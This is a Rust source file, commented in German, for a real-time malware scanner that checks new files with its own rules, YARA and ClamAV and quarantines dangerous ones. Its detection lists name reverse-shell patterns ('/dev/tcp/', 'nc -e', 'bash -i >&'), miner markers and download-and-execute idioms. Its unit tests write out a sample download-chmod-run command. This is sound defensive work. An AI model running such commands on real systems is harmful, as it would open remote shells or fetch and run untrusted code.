//! Echtzeit-Scanner: jede neu geschriebene Datei passender Art (Programme, Skripte, Dokumente, Archive)
//! wird geprüft – mit eigenen Regeln (sofort), YARA-Regeln und der ClamAV-Virenliste.
//! ClamAV braucht rund 1 GB Arbeitsspeicher, deshalb läuft es nur bei Bedarf und geht nach 10 Minuten Ruhe wieder aus.
use crate::quarantaene::Quarantaene;
use crate::{Ereignis, Meldung};
use gemeinsam::datei;
use gemeinsam::json::J;
use std::fs::File;
use std::io::{Read, Seek, SeekFrom, Write};
use std::os::unix::io::AsRawFd;
use std::os::unix::net::UnixStream;
use std::path::Path;
use std::sync::mpsc::{Receiver, RecvTimeoutError, Sender};
use std::sync::Arc;
use std::time::{Duration, Instant};

pub const CLAM_SOCKET: &str = "/run/clamd.auriliux/clamd.sock";
pub const CLAM_DIENST: &str = "auriliux-virenscanner.service";
pub const YARA_REGELN: &str = "/usr/share/auriliux/guardian/regeln.yar";
const EICAR: &str = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
const GRENZE: u64 = 100 * 1024 * 1024;

#[derive(Clone, Default)]
pub struct Stand {
    pub clam: String,
    pub signaturen: i64,
    pub geprueft: u64,
    pub funde: u64,
    pub uebersprungen: u64,
}

impl Stand {
    pub fn json(&self) -> J {
        J::o(vec![
            ("clam", J::t(&self.clam)),
            ("signaturen", J::I(self.signaturen)),
            ("geprueft", J::I(self.geprueft as i64)),
            ("funde", J::I(self.funde as i64)),
            ("uebersprungen", J::I(self.uebersprungen as i64)),
        ])
    }
}

#[derive(Clone, Copy, PartialEq, Debug)]
pub enum Art {
    Skript,
    Programm,
    Dokument,
    Archiv,
}

pub struct Auftrag {
    pub datei: File,
    pub pfad: String,
    pub uid: u32,
    pub art: Art,
}

/// Ist das eine Datei, die geprüft werden soll? (Fotos, Musik, Filme, Text werden nicht gescannt)
pub fn art_von(pfad: &str, kopf: &[u8], ausfuehrbar: bool) -> Option<Art> {
    let name = pfad.rsplit('/').next().unwrap_or("").to_lowercase();
    let endung = if name.contains('.') { name.rsplit('.').next().unwrap_or("") } else { "" };
    if kopf.starts_with(b"\x7fELF") {
        return Some(Art::Programm);
    }
    if kopf.starts_with(b"#!") || enthaelt(kopf, EICAR.as_bytes()) {
        return Some(Art::Skript);
    }
    if kopf.starts_with(b"MZ") {
        return Some(Art::Programm);
    }
    let skripte = [
        "sh", "bash", "zsh", "fish", "py", "pl", "rb", "js", "mjs", "cjs", "vbs", "vbe", "ps1", "psm1", "bat", "cmd",
        "desktop", "php", "lua", "command", "hta", "wsf", "service", "timer",
    ];
    let programme = ["exe", "dll", "msi", "scr", "com", "appimage", "run", "bin", "elf", "deb", "rpm", "apk", "so"];
    let dokumente = [
        "pdf", "doc", "docx", "docm", "xls", "xlsx", "xlsm", "ppt", "pptx", "pptm", "rtf", "odt", "ods", "odp", "html",
        "htm", "svg", "eml", "chm", "one", "lnk",
    ];
    let archive = ["zip", "7z", "rar", "tar", "gz", "tgz", "bz2", "xz", "zst", "iso", "img", "dmg", "jar", "cab"];
    if skripte.contains(&endung) || getarnt(&name) {
        return Some(Art::Skript);
    }
    if programme.contains(&endung) {
        return Some(Art::Programm);
    }
    if dokumente.contains(&endung) {
        return Some(Art::Dokument);
    }
    if archive.contains(&endung) {
        return Some(Art::Archiv);
    }
    if ausfuehrbar {
        return Some(Art::Skript);
    }
    None
}

fn enthaelt(heu: &[u8], nadel: &[u8]) -> bool {
    !nadel.is_empty() && heu.windows(nadel.len()).any(|w| w == nadel)
}

/// „Rechnung.pdf.exe“ – sieht aus wie ein Dokument, ist aber ein Programm
pub fn getarnt(name: &str) -> bool {
    let teile: Vec<&str> = name.split('.').map(|t| t.trim()).collect();
    if teile.len() < 3 {
        return false;
    }
    let letzte = teile[teile.len() - 1];
    let davor = teile[teile.len() - 2];
    let harmlos = ["pdf", "doc", "docx", "xls", "xlsx", "jpg", "jpeg", "png", "txt", "mp3", "mp4", "zip", "odt", "gif"];
    let gefaehrlich = [
        "exe", "sh", "desktop", "scr", "bat", "cmd", "js", "vbs", "appimage", "run", "bin", "jar", "ps1", "com", "hta", "py",
    ];
    harmlos.contains(&davor) && gefaehrlich.contains(&letzte)
}

/// eigene Regeln für Skripte und Verknüpfungen. (gefährlich?, Grund)
pub fn eigene_regeln(name: &str, text: &str) -> Option<(bool, String)> {
    let eins = |ms: &[&str]| ms.iter().any(|m| text.contains(m));
    if text.contains(&EICAR.to_lowercase()) {
        return Some((true, "Test-Virus (EICAR) – eine harmlose Prüfdatei für Virenscanner".into()));
    }
    if getarnt(name) {
        return Some((true, "Getarnte Datei: sieht aus wie ein Dokument, ist aber ein Programm".into()));
    }
    if eins(&["stratum+tcp://", "stratum+ssl://", "xmrig", "--donate-level", "minexmr", "cryptonight"]) {
        return Some((true, "Krypto-Miner: schürft heimlich Kryptogeld mit deinem Prozessor".into()));
    }
    if eins(&["/dev/tcp/", "nc -e ", "ncat -e ", "socat exec:", "bash -i >&", "sh -i >&", "pty.spawn("]) {
        return Some((true, "Öffnet heimlich einen Fernzugang zu deinem Rechner".into()));
    }
    let laedt = eins(&["curl ", "wget ", "curl\t", "wget\t", "invoke-webrequest", "downloadstring", "downloadfile", "urllib.request"]);
    let fuehrt = eins(&["| sh", "|sh", "| bash", "|bash", "sh -c", "bash -c", "iex(", "iex ", "invoke-expression", "| python", "|python"]);
    let versteckt = eins(&["base64 -d", "base64 --decode", "frombase64string", "b64decode", "atob("]);
    let tmp_start = text.contains("chmod +x") && eins(&["/tmp/", "/dev/shm/", "/var/tmp/"]);
    if versteckt && (fuehrt || text.contains("eval") || text.contains("exec(")) {
        return Some((true, "Verschleiertes Skript: entschlüsselt versteckten Code und führt ihn sofort aus".into()));
    }
    if laedt && tmp_start {
        return Some((true, "Lädt ein Programm aus dem Internet nach, macht es ausführbar und startet es".into()));
    }
    if name.ends_with(".desktop") && (laedt || versteckt) {
        return Some((true, "Verknüpfung lädt beim Anklicken heimlich etwas aus dem Internet".into()));
    }
    if laedt && eins(&[".config/autostart", ".bashrc", "crontab", "systemctl --user enable", ".config/systemd/user"]) {
        return Some((false, "Richtet sich selbst einen Autostart ein und lädt dabei aus dem Internet".into()));
    }
    if laedt && fuehrt {
        return Some((false, "Lädt Code aus dem Internet und führt ihn direkt aus (bei Installations-Skripten üblich)".into()));
    }
    None
}

/// YARA-Regelnamen → Bedeutung. „Gefahr_…“ kommt in Quarantäne, „Verdacht_…“ wird nur gemeldet.
fn yara_grund(regel: &str) -> String {
    match regel {
        "Gefahr_Kryptominer" => "Krypto-Miner-Programm".into(),
        "Verdacht_PDF_Skript" => "PDF startet beim Öffnen sofort ein Skript".into(),
        "Verdacht_Office_Makro" => "Office-Datei mit Makro, das beim Öffnen Programme starten kann".into(),
        "Verdacht_Gepackt" => "Programm ist verpackt (verschleiert), wie es Schädlinge oft tun".into(),
        "Gefahr_Windows_Stick" => "Autostart-Datei für Windows-Sticks (verbreitet Viren)".into(),
        r => format!("Regel {}", r),
    }
}

struct Pruefer {
    tx: Sender<Meldung>,
    q: Arc<Quarantaene>,
    stand: Stand,
    clam_an: bool,
    clam_zuletzt: Instant,
    clam_kaputt_bis: Option<Instant>,
}

pub fn signaturen_alter() -> i64 {
    let mut neu = 0i64;
    for n in ["main.cvd", "main.cld", "daily.cvd", "daily.cld", "bytecode.cvd", "bytecode.cld"] {
        if let Ok(m) = std::fs::metadata(format!("/var/lib/clamav/{}", n)) {
            if let Ok(t) = m.modified() {
                if let Ok(d) = t.duration_since(std::time::UNIX_EPOCH) {
                    neu = neu.max(d.as_millis() as i64);
                }
            }
        }
    }
    neu
}

pub fn clam_grundstand() -> String {
    if !Path::new("/usr/sbin/clamd").exists() {
        "fehlt".into()
    } else if signaturen_alter() == 0 {
        "keine-signaturen".into()
    } else {
        "aus".into()
    }
}

pub fn starten(rx: Receiver<Auftrag>, tx: Sender<Meldung>, q: Arc<Quarantaene>) {
    let mut p = Pruefer {
        tx,
        q,
        stand: Stand { clam: clam_grundstand(), signaturen: signaturen_alter(), ..Default::default() },
        clam_an: false,
        clam_zuletzt: Instant::now(),
        clam_kaputt_bis: None,
    };
    if Path::new(CLAM_SOCKET).exists() && ping() {
        p.clam_an = true;
        p.stand.clam = "bereit".into();
    }
    let _ = p.tx.send(Meldung::Scanner(p.stand.clone()));
    let _ = std::thread::Builder::new().name("scanner".into()).spawn(move || loop {
        match rx.recv_timeout(Duration::from_secs(30)) {
            Ok(a) => p.pruefen(a),
            Err(RecvTimeoutError::Timeout) => p.ruhe(),
            Err(RecvTimeoutError::Disconnected) => break,
        }
    });
}

fn ping() -> bool {
    let Ok(mut s) = UnixStream::connect(CLAM_SOCKET) else { return false };
    let _ = s.set_read_timeout(Some(Duration::from_secs(3)));
    if s.write_all(b"zPING\0").is_err() {
        return false;
    }
    let mut a = Vec::new();
    let _ = s.read_to_end(&mut a);
    String::from_utf8_lossy(&a).contains("PONG")
}

impl Pruefer {
    fn melden(&self) {
        let _ = self.tx.send(Meldung::Scanner(self.stand.clone()));
    }

    fn ruhe(&mut self) {
        if self.clam_an && self.clam_zuletzt.elapsed() > Duration::from_secs(600) {
            let _ = datei::befehl("systemctl", &["stop", CLAM_DIENST], 30);
            self.clam_an = false;
            self.stand.clam = clam_grundstand();
            self.melden();
        }
        self.stand.signaturen = signaturen_alter();
    }

    /// ClamAV bei Bedarf starten und warten, bis die Virenliste geladen ist (dauert 20–60 s)
    fn clam_bereit(&mut self) -> bool {
        if self.clam_an {
            return true;
        }
        if let Some(t) = self.clam_kaputt_bis {
            if Instant::now() < t {
                return false;
            }
        }
        if signaturen_alter() == 0 || !Path::new("/usr/sbin/clamd").exists() {
            self.stand.clam = clam_grundstand();
            return false;
        }
        self.stand.clam = "startet".into();
        self.melden();
        let _ = datei::befehl("systemctl", &["start", CLAM_DIENST], 20);
        let ende = Instant::now() + Duration::from_secs(150);
        while Instant::now() < ende {
            if ping() {
                self.clam_an = true;
                self.clam_zuletzt = Instant::now();
                self.stand.clam = "bereit".into();
                self.melden();
                return true;
            }
            std::thread::sleep(Duration::from_millis(1500));
        }
        self.stand.clam = "fehler".into();
        self.clam_kaputt_bis = Some(Instant::now() + Duration::from_secs(1800));
        self.melden();
        false
    }

    fn clam(&mut self, datei: &mut File) -> Result<Option<String>, String> {
        let mut s = UnixStream::connect(CLAM_SOCKET).map_err(|e| e.to_string())?;
        let _ = s.set_read_timeout(Some(Duration::from_secs(180)));
        let _ = s.set_write_timeout(Some(Duration::from_secs(60)));
        s.write_all(b"zINSTREAM\0").map_err(|e| e.to_string())?;
        datei.seek(SeekFrom::Start(0)).map_err(|e| e.to_string())?;
        let mut buf = vec![0u8; 65536];
        let mut gesamt = 0u64;
        loop {
            let n = datei.read(&mut buf).map_err(|e| e.to_string())?;
            if n == 0 || gesamt > GRENZE {
                break;
            }
            s.write_all(&(n as u32).to_be_bytes()).map_err(|e| e.to_string())?;
            s.write_all(&buf[..n]).map_err(|e| e.to_string())?;
            gesamt += n as u64;
        }
        s.write_all(&[0, 0, 0, 0]).map_err(|e| e.to_string())?;
        let mut a = Vec::new();
        let _ = s.read_to_end(&mut a);
        self.clam_zuletzt = Instant::now();
        let t = String::from_utf8_lossy(&a).trim_end_matches('\0').trim().to_string();
        if t.ends_with("FOUND") {
            let name = t.trim_start_matches("stream:").trim().trim_end_matches("FOUND").trim().to_string();
            return Ok(Some(name));
        }
        if t.ends_with("OK") {
            return Ok(None);
        }
        Err(t)
    }

    fn yara(&self, datei: &File) -> Vec<String> {
        if !Path::new(YARA_REGELN).exists() {
            return vec![];
        }
        let pfad = format!("/proc/{}/fd/{}", std::process::id(), datei.as_raw_fd());
        match datei::befehl("yara", &["-w", YARA_REGELN, &pfad], 20) {
            Some((0, aus)) => aus
                .lines()
                .filter_map(|z| z.split_whitespace().next().map(|s| s.to_string()))
                .filter(|s| !s.is_empty())
                .collect(),
            _ => vec![],
        }
    }

    fn pruefen(&mut self, mut a: Auftrag) {
        let name = a.pfad.rsplit('/').next().unwrap_or("").to_string();
        let mut urteil: Option<(bool, String)> = None;
        // 1. eigene Regeln (Skripte, Verknüpfungen, getarnte Dateien)
        if a.art == Art::Skript {
            let mut inhalt = Vec::new();
            let _ = a.datei.seek(SeekFrom::Start(0));
            let _ = (&a.datei).take(1024 * 1024).read_to_end(&mut inhalt);
            let text = String::from_utf8_lossy(&inhalt).to_lowercase();
            urteil = eigene_regeln(&name.to_lowercase(), &text);
        }
        // 2. YARA für Programme, Dokumente, Archive
        if urteil.as_ref().map(|u| !u.0).unwrap_or(true) && a.art != Art::Skript {
            for r in self.yara(&a.datei) {
                let gefahr = r.starts_with("Gefahr_");
                if gefahr || urteil.is_none() {
                    urteil = Some((gefahr, yara_grund(&r)));
                }
                if gefahr {
                    break;
                }
            }
        }
        // 3. Virenliste (ClamAV)
        if urteil.as_ref().map(|u| !u.0).unwrap_or(true) && self.clam_bereit() {
            match self.clam(&mut a.datei) {
                Ok(Some(virus)) => urteil = Some((true, format!("Bekannter Schädling „{}“ (Virenliste)", virus))),
                Ok(None) => {}
                Err(f) => {
                    eprintln!("Guardian: ClamAV-Fehler bei {}: {}", a.pfad, f);
                    if f.contains("Connection") || f.contains("No such file") {
                        self.clam_an = false;
                    }
                }
            }
        }
        self.stand.geprueft += 1;
        if let Some((gefaehrlich, grund)) = urteil {
            self.stand.funde += 1;
            // aktueller Ort (Chrome benennt fertige Downloads noch um)
            let jetzt = gemeinsam::sys::fd_pfad(a.datei.as_raw_fd()).unwrap_or(a.pfad.clone());
            let jetzt = jetzt.trim_end_matches(" (deleted)").to_string();
            let name = jetzt.rsplit('/').next().unwrap_or("").to_string();
            let ordner = jetzt.rsplitn(2, '/').nth(1).unwrap_or("").to_string();
            drop(a.datei);
            if gefaehrlich {
                match self.q.einsperren(&jetzt, a.uid, &grund) {
                    Ok(e) => {
                        let _ = self.tx.send(Meldung::Neu(
                            Ereignis::neu("fund", "hoch", format!("Schädling in Quarantäne: {}", name),
                                format!("{}. Gefunden in {}. Die Datei ist weggesperrt und kann nichts mehr anrichten.", grund, ordner))
                            .knopf("ok", "Verstanden")
                            .datum("q", &e.id)
                            .fuer(a.uid)
                            .schluessel(format!("fund:{}", e.id)),
                        ));
                    }
                    Err(f) => {
                        let _ = self.tx.send(Meldung::Neu(
                            Ereignis::neu("verdacht", "hoch", format!("Gefährliche Datei: {}", name),
                                format!("{}. Wegsperren ging nicht: {}", grund, f))
                            .knopf("ok", "Verstanden")
                            .datum("pfad", &jetzt)
                            .fuer(a.uid)
                            .schluessel(format!("fund:{}", jetzt)),
                        ));
                    }
                }
            } else {
                let _ = self.tx.send(Meldung::Neu(
                    Ereignis::neu("verdacht", "mittel", format!("Verdächtige Datei: {}", name),
                        format!("{}. Liegt in {}. Wenn du sie nicht selbst geladen hast: in Quarantäne.", grund, ordner))
                    .knopf("einsperren", "In Quarantäne")
                    .knopf("behalten", "Behalten")
                    .datum("pfad", &jetzt)
                    .datum("grund", &grund)
                    .fuer(a.uid)
                    .schluessel(format!("verdacht:{}", jetzt)),
                ));
            }
        }
        self.melden();
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn regeln() {
        assert!(getarnt("rechnung.pdf.exe"));
        assert!(!getarnt("urlaub.2024.jpg"));
        assert_eq!(art_von("/x/Foto.JPG", b"\xff\xd8", false), None);
        assert_eq!(art_von("/x/a.sh", b"echo", false), Some(Art::Skript));
        assert_eq!(art_von("/x/prog", b"\x7fELF....", true), Some(Art::Programm));
        assert!(eigene_regeln("a.sh", "curl -s http://x/a -o /tmp/a; chmod +x /tmp/a; /tmp/a").unwrap().0);
        assert!(!eigene_regeln("install.sh", "curl -fssl https://x | sh").unwrap().0);
        assert!(eigene_regeln("a.sh", "echo hallo").is_none());
        assert!(eigene_regeln("eicar.com", &EICAR.to_lowercase()).unwrap().0);
    }
}
